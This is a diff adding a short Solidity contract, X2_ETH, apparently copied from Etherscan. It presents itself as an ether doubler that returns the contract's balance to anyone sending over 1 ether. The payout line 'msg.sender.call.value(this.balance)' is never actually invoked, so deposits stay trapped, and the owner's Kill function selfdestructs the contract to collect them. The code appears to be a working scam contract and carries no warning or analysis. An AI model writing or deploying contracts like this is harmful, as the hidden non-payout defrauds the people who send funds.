@@ -1,0 +1,63 @@
+/**
+
+ *Submitted for verification at Etherscan.io on 2018-12-10
+
+*/
+
+
+
+pragma solidity ^0.4.19;
+
+
+
+contract X2_ETH  
+
+{
+
+    address owner = msg.sender;
+
+    
+
+    function() public payable {}
+
+    
+
+    function X2()
+
+    public
+
+    payable
+
+    {
+
+        if(msg.value > 1 ether)
+
+        {
+
+            msg.sender.call.value(this.balance);
+
+        }
+
+    }
+
+    
+
+    function Kill()
+
+    public
+
+    payable
+
+    {
+
+        if(msg.sender==owner)
+
+        {
+
+            selfdestruct(owner);
+
+        }
+
+    }
+
+}
